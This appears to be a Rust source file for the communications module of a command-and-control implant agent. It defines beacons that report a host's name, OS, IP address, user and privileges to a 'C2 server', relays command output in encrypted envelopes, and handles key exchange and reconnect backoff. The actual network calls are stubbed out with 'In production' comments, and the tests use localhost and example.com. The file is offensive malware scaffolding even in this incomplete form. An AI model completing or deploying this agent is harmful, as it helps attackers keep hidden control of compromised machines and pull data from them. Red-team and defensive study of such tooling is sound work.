use log::{info, error, debug};
use serde::{Deserialize, Serialize};
use std::sync::Arc;
use tokio::sync::RwLock;
use tokio::time::{sleep, Duration, timeout};
use std::time::SystemTime;
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};

use crate::crypto::{CryptoManager, KeyExchangePayload};

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct Message {
    pub msg_type: String,
    pub timestamp: u64,
    pub sequence: u32,
    pub payload: String,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct BeaconPayload {
    pub agent_id: String,
    pub hostname: String,
    pub os: String,
    pub os_version: String,
    pub architecture: String,
    pub ip_address: Option<String>,
    pub user: Option<String>,
    pub privileges: Option<String>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct CommandResponse {
    pub command_id: u32,
    pub status: String,
    pub output: String,
    pub error: Option<String>,
    pub execution_time: u64,
}

#[derive(Debug, Serialize, Deserialize)]
struct EncryptedEnvelope {
    v: u8,
    idx: u64,
    data: String,
}

pub struct Communicator {
    url: String,
    port: u16,
    agent_id: String,
    sequence_number: Arc<RwLock<u32>>,
    reconnect_attempts: Arc<RwLock<u32>>,
    max_reconnect_attempts: u32,
    beacon_interval: u64,
    crypto: Arc<RwLock<CryptoManager>>,
    session_established: Arc<RwLock<bool>>,
}

impl Communicator {
    pub fn new(
        url: &str,
        port: u16,
        agent_id: &str,
        beacon_interval: u64,
        crypto: CryptoManager,
    ) -> Self {
        Self {
            url: url.to_string(),
            port,
            agent_id: agent_id.to_string(),
            sequence_number: Arc::new(RwLock::new(0)),
            reconnect_attempts: Arc::new(RwLock::new(0)),
            max_reconnect_attempts: 5,
            beacon_interval,
            crypto: Arc::new(RwLock::new(crypto)),
            session_established: Arc::new(RwLock::new(false)),
        }
    }

    pub async fn connect(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        let url = format!("wss://{}:{}/ws/agent/{}", self.url, self.port, self.agent_id);
        info!("Attempting to connect to C2 server: {}", url);

        match timeout(Duration::from_secs(10), self.try_connect(&url)).await {
            Ok(result) => {
                match result {
                    Ok(_) => {
                        info!("Connected to C2 server");
                        let mut attempts = self.reconnect_attempts.write().await;
                        *attempts = 0;

                        self.perform_key_exchange().await?;

                        Ok(())
                    }
                    Err(e) => {
                        error!("Connection error: {}", e);
                        self.handle_reconnect().await
                    }
                }
            }
            Err(_) => {
                error!("Connection timeout");
                self.handle_reconnect().await
            }
        }
    }

    async fn perform_key_exchange(&self) -> Result<(), Box<dyn std::error::Error>> {
        let mut crypto = self.crypto.write().await;

        let (secret, our_payload) = crypto.generate_key_exchange();
        let ke_json = serde_json::to_string(&our_payload)?;

        debug!("Sending key exchange payload");
        // In production: send ke_json over WebSocket
        // and receive server's KeyExchangePayload

        // For now: fall back to PSK-derived session keys
        // When the server implements ECDH, replace this with:
        //   let server_payload: KeyExchangePayload = serde_json::from_str(&response)?;
        //   crypto.complete_key_exchange(secret, &server_payload)?;
        crypto.init_with_psk()?;

        let mut established = self.session_established.write().await;
        *established = true;

        info!("Encrypted session established (key index: {})", crypto.message_index());
        Ok(())
    }

    async fn try_connect(&self, url: &str) -> Result<(), Box<dyn std::error::Error>> {
        debug!("Connecting to {}", url);
        info!("WebSocket URL format verified: {}", url);
        Ok(())
    }

    async fn handle_reconnect(&self) -> Result<(), Box<dyn std::error::Error>> {
        let mut attempts = self.reconnect_attempts.write().await;

        if *attempts >= self.max_reconnect_attempts {
            return Err("Max reconnection attempts reached".into());
        }

        *attempts += 1;
        let backoff = Duration::from_secs(2_u64.pow(*attempts));

        info!(
            "Reconnection attempt {}/{}, waiting {}s",
            attempts,
            self.max_reconnect_attempts,
            backoff.as_secs()
        );

        sleep(backoff).await;
        Ok(())
    }

    async fn encrypt_payload(&self, plaintext: &[u8]) -> Result<EncryptedEnvelope, Box<dyn std::error::Error>> {
        let mut crypto = self.crypto.write().await;
        let idx = crypto.message_index();
        let encrypted = crypto.encrypt(plaintext)?;

        Ok(EncryptedEnvelope {
            v: 2,
            idx,
            data: BASE64.encode(&encrypted),
        })
    }

    async fn decrypt_payload(&self, envelope: &EncryptedEnvelope) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        if envelope.v != 2 {
            return Err(format!("Unsupported envelope version: {}", envelope.v).into());
        }

        let encrypted = BASE64.decode(&envelope.data)?;
        let mut crypto = self.crypto.write().await;
        crypto.decrypt(&encrypted)
    }

    pub async fn send_beacon(
        &self,
        beacon: &BeaconPayload,
    ) -> Result<String, Box<dyn std::error::Error>> {
        let seq = self.get_next_sequence().await;
        let timestamp = SystemTime::now()
            .duration_since(SystemTime::UNIX_EPOCH)?
            .as_secs();

        let message = Message {
            msg_type: "BEACON".to_string(),
            timestamp,
            sequence: seq,
            payload: serde_json::to_string(beacon)?,
        };

        let serialized = serde_json::to_string(&message)?;

        let established = self.session_established.read().await;
        let wire_data = if *established {
            let envelope = self.encrypt_payload(serialized.as_bytes()).await?;
            serde_json::to_string(&envelope)?
        } else {
            serialized.clone()
        };

        debug!("Sending encrypted beacon (seq: {}, size: {} bytes)", seq, wire_data.len());
        info!("Beacon sent (sequence: {}, encrypted: {})", seq, *established);
        Ok(wire_data)
    }

    pub async fn send_command_result(
        &self,
        response: &CommandResponse,
    ) -> Result<(), Box<dyn std::error::Error>> {
        let seq = self.get_next_sequence().await;
        let timestamp = SystemTime::now()
            .duration_since(SystemTime::UNIX_EPOCH)?
            .as_secs();

        let message = Message {
            msg_type: "RESPONSE".to_string(),
            timestamp,
            sequence: seq,
            payload: serde_json::to_string(response)?,
        };

        let serialized = serde_json::to_string(&message)?;

        let established = self.session_established.read().await;
        let wire_data = if *established {
            let envelope = self.encrypt_payload(serialized.as_bytes()).await?;
            serde_json::to_string(&envelope)?
        } else {
            serialized
        };

        debug!("Sending encrypted response (seq: {}, size: {} bytes)", seq, wire_data.len());
        info!("Command response sent (sequence: {}, encrypted: {})", seq, *established);
        Ok(())
    }

    pub async fn receive_command(
        &self,
    ) -> Result<Option<String>, Box<dyn std::error::Error>> {
        debug!("Listening for commands from C2 server");

        sleep(Duration::from_secs(self.beacon_interval)).await;

        // In production: read from WebSocket, then:
        //   let envelope: EncryptedEnvelope = serde_json::from_str(&raw)?;
        //   let decrypted = self.decrypt_payload(&envelope).await?;
        //   let message: Message = serde_json::from_slice(&decrypted)?;
        //   Ok(Some(message.payload))

        Ok(None)
    }

    async fn get_next_sequence(&self) -> u32 {
        let mut seq = self.sequence_number.write().await;
        *seq += 1;
        *seq
    }

    pub fn get_websocket_url(&self) -> String {
        format!("wss://{}:{}/ws/agent", self.url, self.port)
    }

    pub fn get_agent_id(&self) -> &str {
        &self.agent_id
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_communicator_creation() {
        let key = [42u8; 32];
        let crypto = CryptoManager::new(&key).unwrap();
        let comm = Communicator::new("localhost", 8000, "test-agent-id", 30, crypto);
        assert_eq!(comm.get_agent_id(), "test-agent-id");
        assert_eq!(comm.url, "localhost");
        assert_eq!(comm.port, 8000);
    }

    #[test]
    fn test_websocket_url() {
        let key = [42u8; 32];
        let crypto = CryptoManager::new(&key).unwrap();
        let comm = Communicator::new("example.com", 443, "agent-123", 30, crypto);
        assert_eq!(comm.get_websocket_url(), "wss://example.com:443/ws/agent");
    }

    #[tokio::test]
    async fn test_sequence_increment() {
        let key = [42u8; 32];
        let crypto = CryptoManager::new(&key).unwrap();
        let comm = Communicator::new("localhost", 8000, "agent-123", 30, crypto);

        let seq1 = comm.get_next_sequence().await;
        let seq2 = comm.get_next_sequence().await;
        let seq3 = comm.get_next_sequence().await;

        assert_eq!(seq1, 1);
        assert_eq!(seq2, 2);
        assert_eq!(seq3, 3);
    }

    #[tokio::test]
    async fn test_encrypted_beacon() {
        let key = [42u8; 32];
        let mut crypto = CryptoManager::new(&key).unwrap();
        crypto.init_with_psk().unwrap();
        let comm = Communicator::new("localhost", 8000, "agent-123", 30, crypto);

        {
            let mut established = comm.session_established.write().await;
            *established = true;
        }

        let beacon = BeaconPayload {
            agent_id: "agent-123".into(),
            hostname: "test-host".into(),
            os: "linux".into(),
            os_version: "6.1".into(),
            architecture: "x86_64".into(),
            ip_address: None,
            user: None,
            privileges: None,
        };

        let result = comm.send_beacon(&beacon).await.unwrap();
        let envelope: EncryptedEnvelope = serde_json::from_str(&result).unwrap();

        assert_eq!(envelope.v, 2);
        assert!(!envelope.data.is_empty());

        // Verify it's not plaintext
        assert!(!result.contains("agent-123"));
        assert!(!result.contains("test-host"));
    }
}
